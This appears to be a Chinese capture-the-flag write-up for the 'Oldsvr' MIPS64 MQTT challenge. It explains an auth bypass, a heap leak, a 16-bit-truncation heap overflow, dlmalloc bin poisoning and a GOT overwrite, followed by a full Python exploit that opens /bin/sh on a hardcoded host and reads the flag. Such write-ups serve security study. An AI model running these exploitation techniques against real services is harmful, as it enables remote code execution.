@@ -1,0 +1,283 @@
+<!doctype html><meta charset="utf-8"><p>来源：https://coder.lufer.cc/2026/11/%E7%AC%AC%E5%8D%81%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFwp/</p><h2 class="wp-block-heading">Oldsvr</h2>
+<h3 class="wp-block-heading">题解</h3>
+<h4 class="wp-block-heading">解题思路</h4>
+<p class="wp-block-paragraph">一个 MIPS64 大端 MQTT 服务（PIE + uClibc 1.0.32 dlmalloc，跑在 <code>qemu-mips64-static</code> 下）。 四个漏洞串起来：用户名比较的<strong>长度截断 <code>strncmp</code></strong> 绕过认证、news 回声的 <strong>UAF 泄漏堆地址</strong>、 广播组包时 <strong>16 位截断导致的 64 KiB 堆溢出</strong>，以及被改写后的 entry 表把 PUBLISH 的 “复用缓冲区” 分支变成<strong>任意地址写</strong>。最终不需要栈溢出：用<strong>假 chunk + unsorted bin</strong> 从 broadcast 回显里拿到 libc，再 <code>GOT[__libc_free] = system</code>，用 grow 路径的 <code>free("/bin/sh")</code> 起 shell。</p>
+<h5 class="wp-block-heading">Step 1: 静态/动态侦察得到协议与三处关键地址关系</h5>
+<p class="wp-block-paragraph"><code>file server</code>：ELF64 MIPS big-endian, PIE, 动态链接 <code>libuClibc-1.0.32.so</code>；2283/2883 端口对外 （笔记里 1883 拒连，2883 是同一实例）。用自建的 unicorn 模拟器（含 uClibc 重定位 + Linux syscall 模拟）把 <code>server</code> + <code>libuClibc</code> 跑起来，可以带 malloc/free 返回值和 mstate/bins 转储调试。</p>
+<p class="wp-block-paragraph">协议要点（PIE 相对地址）：</p>
+<ul class="wp-block-list">
+<li>帧头 <code>type + varint(len)</code>，body 结构各自解析；<code>F_226c</code> 算 <code>payload_len</code>， <code>payload = buf + (u8)(h + tlen + 3)</code>（<strong>截断到 1 字节</strong>）。</li>
+<li>状态结构 <code>state = *(PIE+0x20330)</code>，16 字节：<code>[0]=carry, [1]=auth, [2]=news, [3]=ping计数</code>。</li>
+<li>entry 表 <code>PIE+0x20338</code>，14 项 × 0x20：<code>topic(8) / len(2) / buf(8)+0x10 / size(2)+0x18</code>。</li>
+<li>reader <code>F_439c</code>：缓冲在 <code>fp+0x30</code>，<code>carry = state[0]</code>， <code>read(0, buf+carry, 5-carry)</code>（carry≥5 时 count 变成巨大值），帧尾 limit <code>L ≤ 0x1800b</code>， 保护寄存器在 <code>fp+0x18058/0x18060/0x18068</code>。</li>
+</ul>
+<p class="wp-block-paragraph">三个”常量”关系（远程实测/推导，全部经验证）：</p>
+<ul class="wp-block-list">
+<li><code>heap = leak - 0xf0</code>（news 回声读出的空闲 topic chunk 地址）</li>
+<li><strong><code>pie = heap - 0x22000</code></strong>：镜像 <code>p_memsz</code> 到 0x20540，qemu-user 把 brk 放到页对齐后的 0x21000，再加一页 → 0x22000。（用 <code>xpie.py</code> 写的 oracle 唯一确认：把 pop#1 的 <code>*(F+0x10) = bin_at</code> 精确指向 <code>entry[0].len</code>，只有真实 pie 才会让 news 广播消失且进程存活。）</li>
+<li>远程堆布局 = 本地模拟器布局 <strong>+0x70</strong>（stdio FILE chunk 先占掉 0x70）</li>
+</ul>
+<h5 class="wp-block-heading">Step 2: 三个漏洞 → 一条”任意写”链</h5>
+<ol class="wp-block-list">
+<li><strong>认证绕过</strong>：用户名比较是 <code>strncmp(xor(user), "LJ_/-/+B\ypts", user_len)</code>，<code>user_len</code> 来自 帧里我们给的长度；只发 1 字节 <code>'Q'</code>（<code>'Q'^0x1d='L'</code>）即可通过。</li>
+<li><strong>堆泄漏</strong>：订阅两个 32 字节 topic 再退订，然后 <code>PUBLISH QWB2026_News &lt;32B&gt;</code>。 <code>F_37d8</code> 在 <code>entry-&gt;size &lt; 33</code> 时先 <code>free(entry-&gt;buf)</code> 再组包广播，于是把 freed chunk 的 fastbin <code>fd</code> 原样回显 → 堆指针。</li>
+<li><strong>64 KiB 溢出</strong>：广播组包 <code>F_2610</code> 里 <code>p3 = malloc((u16)(hdrbytes + hdr_len + payload_len))</code>，拷贝却是 <code>payload_len</code>。 <code>payload_len = 65520</code> 时 <code>total3 = (u16)(2+16+65520) = 2</code> → <code>malloc(2)</code> + 64 KiB 拷贝， 而且 <code>p3</code> 恰好是 0x20 类的第三次 malloc（落点很低），溢出从 <code>p3+18</code> 覆盖整个堆。</li>
+<li><strong>任意 malloc 返回 → entry 表改写</strong>：dlmalloc 的 <strong>small-bin pop 不检查</strong>： <code>bin-&gt;bk = victim-&gt;bk; *(victim-&gt;bk + 0x10) = bin_at; return victim+0x10</code>。 把 <code>victim-&gt;bk</code> 改成 <code>F</code>，下一次同类 malloc 就返回 <code>F+0x10</code>。 于是两次 0x50 类 malloc（pop victim → pop F）让 <code>PUBLISH</code> 的 store malloc 返回 <code>&amp;entry[11]+8</code>，store 的 <code>memset+memcpy</code> 直接把 entry 表改写成 <code>{len=24, buf=目标, size=8}</code>。</li>
+<li><strong>任意写</strong>：条目被改写后再 PUBLISH 到该 topic，<code>F_3a34</code> 走 <code>entry-&gt;size &gt;= payload_len</code> 的 <strong>复用分支</strong>：<code>memset(entry-&gt;buf,0,size); memcpy(entry-&gt;buf,payload,pl)</code> —— 目标地址 完全由我们决定，长度最多 64 KiB。</li>
+</ol>
+<h5 class="wp-block-heading">Step 3: 不碰栈，直接偷 libc 并劫持 GOT</h5>
+<p class="wp-block-paragraph">栈溢出那条路（carry≥5 的巨型 <code>read</code>）需要<strong>单次 read 拿到 ~98 KB</strong>，而 RTT≈57 ms， 服务器会在第一段 TCP 到达时就返回，永远覆盖不到 <code>fp+0x18068</code>。于是改走：</p>
+<ul class="wp-block-list">
+<li><strong>假 chunk 偷 libc</strong>：在一条我们完全控制的 200 字节缓冲区里伪造一个 chunk （<code>size=0x61</code>，并伪造”下一个 chunk 在用”以跳过合并）。用 0x30 类的 double-pop 让 store malloc 返回它，<code>entry[0].buf = FAKE+0x10</code> 且 <code>size=32 &lt; 33</code>，于是 <code>F_37d8</code> 立刻 <code>free()</code> 这个假 chunk → dlmalloc 把它链进 unsorted bin，把 <strong>mstate 指针</strong>写进 <code>FAKE+0x10/0x18</code>；紧接着的 broadcast 从同一地址拷 32 字节发给客户端 → <code>libc = leaked_word - 0xc2d48</code>（bin0 伪 chunk 偏移）。</li>
+<li><strong>GOT 劫持</strong>：再走一次 0x50 类 double-pop 把 <code>entry[11].buf</code> 改成 <code>&amp;GOT[__libc_free]</code>、 <code>size=8</code>，PUBLISH 8 字节 = <code>system</code> → <code>GOT[__libc_free] = system</code>。</li>
+<li><strong>触发</strong>：先 <code>PUBLISH '/bin/sh\0'</code> 让 <code>entry[1].buf</code> 内容就是命令字符串，再 PUBLISH 一个 更大的 payload 走 grow 分支：<code>free(旧缓冲区)</code> → <code>system("/bin/sh")</code> → 拿到 shell， <code>cat /flag*</code>。</li>
+</ul>
+<h5 class="wp-block-heading">Step 4: 完整解题脚本</h5>
+<pre class="wp-block-code"><code class="language-Python" lang="Python"><em>#!/usr/bin/env python3</em>
+"""QWB2026_News (oldsvr) exploit - MIPS64 big-endian MQTT server, uClibc 1.0.32 dlmalloc.
+
+  1. auth bypass (length-truncating strncmp) + 32B-topic UAF echo  -&gt; heap base
+  2. pie_base = heap_base - 0x22000 (qemu-user puts the brk right after the image)
+  3. groom two isolated free chunks (0x30-class H30, 0x50-class V50) and a fully
+     controlled 200-byte buffer that hosts a fake chunk
+  4. PUBLISH with payload_len 65520: 16-bit truncation makes the packet buffer
+     malloc(2) while memcpy writes 64 KiB -&gt; overflow from p3+18 poisons
+     H30-&gt;bk = FAKE and V50-&gt;bk = &amp;entry[11]-8
+  5. pop H30, then a news PUBLISH makes the store malloc() return FAKE+0x10; that
+     buffer is freed at once (size&lt;33), dlmalloc bins the *fake* chunk and writes
+     mstate pointers into it; the broadcast copies them back -&gt; libc base
+  6. pop V50 twice -&gt; store malloc() returns &amp;entry[11]+8; entry table rewritten to
+     {len=24, buf=&amp;GOT[free], size=8}
+  7. publish system()'s address -&gt; GOT[__libc_free] = system
+  8. publish "/bin/sh", then a bigger payload: grow path frees the old buffer
+     -&gt; system("/bin/sh") -&gt; cat /flag*
+"""
+import socket
+import struct
+import sys
+import time
+
+NEWS = b'QWB2026_News'
+PWD = bytes.fromhex('70770162cfd6')
+A32 = b'A' * 32
+B32 = b'B' * 32
+T7 = b'SEVEN77'                          <em># entry 1  (shell string)</em>
+T5 = b'FIVER'                            <em># entry 2  (drives the 0x50 pops)</em>
+T4 = [b'%04d' % i for i in range(8)]     <em># entries 3..10 (0x20-class padding)</em>
+TG = b'X' * 24                           <em># entry 11 (rewrite target)</em>
+TX = b'Y' * 32                           <em># entry 12 (builds the high 0x30 chunk)</em>
+VIC = b'W' * 56                          <em># entry 13 (0x50-class victim)</em>
+
+H = lambda v: struct.pack('&gt;Q', v)
+
+SHIFT = 0x70             <em># remote heap prelude (stdio FILE chunk)</em>
+PIE_FROM_HEAP = 0x22000  <em># verified with an oracle</em>
+BIN0_OFF = 0xc2d48       <em># libc offset of mstate-&gt;bins[0] pseudo-chunk</em>
+SYSTEM_OFF = 0x65370     <em># libc offset of system()</em>
+PL = 65520               <em># payload_len that triggers the 16-bit truncation</em>
+
+
+def varint(n):
+    out = b''
+    while True:
+        b = n % 128
+        n //= 128
+        if n:
+            out += bytes([b | 0x80])
+        else:
+            return out + bytes([b])
+
+
+def frame(t, body):
+    return bytes([t]) + varint(len(body)) + body
+
+
+def connect_pkt():
+    vh = b'\x00\x04MQTT\x04\xc2\x43\x21'
+    pl = (struct.pack('&gt;H', 10) + b'QWB_Client' +
+          struct.pack('&gt;H', 1) + b'Q' +
+          struct.pack('&gt;H', len(PWD)) + PWD)
+    return frame(0x10, vh + pl)
+
+
+def sub_pkt(topic, pid):
+    return frame(0x82, struct.pack('&gt;H', pid) + struct.pack('&gt;H', len(topic)) + topic + b'\x00')
+
+
+def unsub_pkt(topic, pid):
+    return frame(0xA2, struct.pack('&gt;H', pid) + struct.pack('&gt;H', len(topic)) + topic)
+
+
+def pub_pkt(topic, payload):
+    return frame(0x30, struct.pack('&gt;H', len(topic)) + topic + payload)
+
+
+class Conn:
+    def __init__(self, host, port):
+        self.s = socket.create_connection((host, port), timeout=10)
+        self.s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        self.s.settimeout(3)
+
+    def send(self, data):
+        self.s.sendall(data)
+
+    def drain(self, t=0.8):
+        self.s.settimeout(t)
+        out = b''
+        while True:
+            try:
+                d = self.s.recv(65536)
+            except (socket.timeout, OSError):
+                break
+            if not d:
+                break
+            out += d
+        return out
+
+    def step(self, data, t=0.8):
+        self.send(data)
+        return self.drain(t)
+
+
+def exploit(c, log=print):
+    <em># ---- 1. heap leak ----</em>
+    c.step(sub_pkt(NEWS, 1))
+    c.step(sub_pkt(A32, 2))
+    c.step(sub_pkt(B32, 3))
+    c.step(unsub_pkt(A32, 4))
+    c.step(unsub_pkt(B32, 5))
+    for _ in range(6):                     <em># state[3] must be 6 for the broadcast</em>
+        c.step(b'\xc0\x00', 0.4)
+    r = c.step(pub_pkt(NEWS, b'C' * 32), 2.0)
+    if len(r) &lt; 26:
+        return False
+    heap = int.from_bytes(r[18:26], 'big') - 0xf0
+    if heap &amp; 0xfff:
+        return False
+    pie = heap - PIE_FROM_HEAP
+    log('[+] heap=%#x  pie=%#x' % (heap, pie))
+
+    <em># ---- 2. groom ----</em>
+    c.step(sub_pkt(T7, 11))
+    c.step(sub_pkt(T5, 12))
+    pid = 13
+    for t in T4:
+        c.send(sub_pkt(t, pid)); pid += 1
+    c.drain(1.0)
+    c.step(sub_pkt(TG, 40))
+    c.step(sub_pkt(TX, 41))
+    c.step(pub_pkt(TX, b'1' * 24))     <em># H30 (0x30 chunk) at the top</em>
+    c.step(pub_pkt(TG, b'3' * 200))    <em># fake-chunk buffer right above H30</em>
+    c.step(pub_pkt(TX, b'2' * 40))     <em># grow -&gt; free(H30), neighbours still live</em>
+    c.step(sub_pkt(VIC, 42))           <em># V50 (0x50 chunk)</em>
+    c.step(pub_pkt(TX, b'4' * 200))    <em># live chunk above V50</em>
+    log('[+] groom done')
+
+    H30 = heap + SHIFT + 0x220
+    FAKE = heap + SHIFT + 0x260        <em># fake chunk inside the 200-byte buffer</em>
+    V50 = heap + SHIFT + 0x330
+    P3 = heap + SHIFT + 0x1d0          <em># packet buffer of the truncated publish</em>
+    COPY = P3 + 18
+    F2 = pie + 0x20338 + 11 * 0x20 - 8  <em># fake chunk overlapping entry[11]</em>
+    pay = bytearray(b'\x00' * PL)
+
+    def patch(addr, data):
+        off = addr - COPY
+        assert 0 &lt;= off and off + len(data) &lt;= PL, hex(addr)
+        pay[off:off + len(data)] = data
+
+    patch(heap + SHIFT + 0x1e8, H(0x21))     <em># keep untouched chunk headers valid</em>
+    patch(heap + SHIFT + 0x208, H(0x21))
+    patch(H30 + 8, H(0x31))
+    patch(H30 + 0x10, H(H30))
+    patch(H30 + 0x18, H(FAKE))               <em># poison -&gt; fake chunk</em>
+    patch(V50 + 8, H(0x51))
+    patch(V50 + 0x10, H(V50))
+    patch(V50 + 0x18, H(F2))                 <em># poison -&gt; entry[11]-8</em>
+    patch(FAKE - 0x10 + 8, H(0xe1))          <em># buffer's own chunk header</em>
+    patch(FAKE + 0x08, H(0x61))              <em># fake size 0x60 | PREV_INUSE</em>
+    patch(FAKE + 0x18, H(FAKE + 0x50))       <em># pointer used by the bin pop</em>
+    patch(FAKE + 0x68, H(0x21))              <em># fake next chunk, marked in use</em>
+    patch(FAKE + 0x88, H(0x21))
+    patch(heap + SHIFT + 0x468, H(0x10001))  <em># store buffer chunk header</em>
+    for i in (5, 3, 1):                      <em># three isolated 0x20 chunks -&gt; p1/p2/p3</em>
+        c.send(unsub_pkt(T4[i], 60 + i))
+    c.drain(0.8)
+    c.step(unsub_pkt(VIC, 70))
+    r = c.step(pub_pkt(NEWS, bytes(pay)), 3.0)
+    if r[:2] != b'\x34\x00':
+        return False
+    log('[+] overflow / poison done')
+
+    <em># ---- 3. libc leak through the broadcast ----</em>
+    c.step(pub_pkt(T4[0], b'a' * 32), 1.2)       <em># pop H30 -&gt; bin-&gt;bk = FAKE</em>
+    r = c.step(pub_pkt(NEWS, b'b' * 32), 2.0)    <em># pop FAKE, binned, echoed back</em>
+    libc = None
+    if len(r) &gt;= 26:
+        for off in range(18, len(r) - 7):
+            w = int.from_bytes(r[off:off + 8], 'big')
+            if w and ((w - BIN0_OFF) &amp; 0xfff) == 0:
+                libc = w - BIN0_OFF
+                break
+    if not libc:
+        return False
+    system = libc + SYSTEM_OFF
+    log('[+] libc=%#x  system=%#x' % (libc, system))
+
+    <em># ---- 4. rewrite entry[11] -&gt; buf = &amp;GOT[free], size = 8 ----</em>
+    GOT_FREE = pie + 0x20220
+    c.step(pub_pkt(T5, b'B' * 56), 1.2)          <em># pop V50 -&gt; bin-&gt;bk = entry[11]-8</em>
+    ne = (struct.pack('&gt;H', 24) + b'\x00' * 6 +  <em># entry11.len = 24</em>
+          H(GOT_FREE) +                          <em># entry11.buf</em>
+          struct.pack('&gt;H', 8) + b'\x00' * 6)    <em># entry11.size = 8</em>
+    ne += b'\x00' * (64 - len(ne))
+    c.step(pub_pkt(T5, bytes(ne)), 1.2)          <em># store malloc -&gt; &amp;entry[11]+8</em>
+    c.step(pub_pkt(TG, H(system)), 1.2)          <em># GOT[__libc_free] = system</em>
+    log('[+] GOT[__libc_free] = system')
+
+    <em># ---- 5. trigger system("/bin/sh") ----</em>
+    c.step(pub_pkt(T7, b'/bin/sh\x00'), 1.0)     <em># buffer holding the command</em>
+    c.send(pub_pkt(T7, b'Z' * 100))              <em># grow -&gt; free(old) -&gt; system</em>
+    time.sleep(1.5)
+    c.drain(1.5)
+    c.s.settimeout(6)
+    c.send(b'cat /flag*; echo END\n')
+    out = b''
+    t0 = time.time()
+    while time.time() - t0 &lt; 8:
+        out += c.drain(1.0)
+        if b'END' in out:
+            break
+    log(out.decode('latin1', 'replace'))
+    return True
+
+
+def main():
+    host = sys.argv[1] if len(sys.argv) &gt; 1 else '47.105.126.181'
+    port = int(sys.argv[2]) if len(sys.argv) &gt; 2 else 2883
+    rounds = int(sys.argv[3]) if len(sys.argv) &gt; 3 else 5
+    for att in range(rounds):
+        print('=== attempt %d ===' % att)
+        try:
+            c = Conn(host, port)
+        except Exception as ex:
+            print('[!] connect: %r' % (ex,))
+            time.sleep(1)
+            continue
+        c.send(connect_pkt())
+        r = c.drain(3.0)
+        if r[:4] != b'\x20\x02\x00\x00':     <em># service is flaky -&gt; retry</em>
+            print('[*] CONNACK %s' % r.hex())
+            c.s.close(); time.sleep(0.8); continue
+        try:
+            if exploit(c):
+                return
+        except Exception as ex:
+            print('[!] %r' % (ex,))
+        c.s.close()
+        time.sleep(0.8)
+    print('[-] failed after %d attempts' % rounds)
+
+
+if __name__ == '__main__':
+    main()</code></pre>
